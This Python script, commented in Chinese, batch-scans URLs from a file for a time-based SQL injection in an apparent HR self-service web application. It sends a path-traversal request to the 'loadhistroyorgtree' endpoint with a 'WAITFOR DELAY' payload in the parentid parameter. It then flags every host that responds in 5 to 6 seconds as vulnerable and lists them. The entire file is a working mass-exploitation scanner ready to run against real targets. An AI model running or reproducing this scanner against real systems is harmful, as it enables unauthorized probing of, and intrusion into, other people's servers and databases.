import http.client
import time
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
colorama.init()

# ANSI转义序列
RED = "\033[91m"
WHITE = "\033[0m"

def send_request(url, vulnerable_urls):
    try:
        parsed_url = urlparse(url)
        scheme = parsed_url.scheme
        host = parsed_url.netloc
        path = parsed_url.path + "?" + parsed_url.query

        if not host:
            print("非法URL:", url)
            return

        # 默认端口
        default_ports = {'http': 80, 'https': 443}

        if ":" not in host:
            # 如果端口未指定，则使用默认端口
            port = default_ports.get(scheme, 80)
        else:
            # 解析端口
            host, port = host.split(":")
            port = int(port)

        # 构建请求头
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }
        
        path = "/w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target"
        
        start_time = time.time()
        # 发送 GET 请求
        conn = http.client.HTTPSConnection(host, port) if scheme == 'https' else http.client.HTTPConnection(host, port)
        conn.request("GET", path, headers=headers)
        
        # 获取响应
        response = conn.getresponse()
        end_time = time.time()
        
        # 计算响应时间
        response_time = end_time - start_time

        # 判断是否存在漏洞
        if 5 < response_time < 6:
            print(Fore.RED + f"[+] 报告发现loadhistroyorgtree注入 {url} " + Style.RESET_ALL)
            vulnerable_urls.append(url)
        
        # # 打印响应
        # print("响应状态:", response.status)
        # print("响应头:", response.getheaders())
        # print("响应内容:")
        # print(response.read().decode("utf-8"))
        
        # 关闭连接
        conn.close()
    except Exception as e:
        print(Fore.GREEN + f"[-] 貌似不存在，换个姿势尝试 {url} ")

if __name__ == "__main__":
    vulnerable_urls = []
    with open("1.txt", "r") as file:
        for line in file:
            url = line.strip()
            send_request(url, vulnerable_urls)
    
    # 输出存在漏洞的 URL 统计
    print(Fore.RED + f"\n存在漏洞的URL:")
    for vulnerable_url in vulnerable_urls:
        print(vulnerable_url)
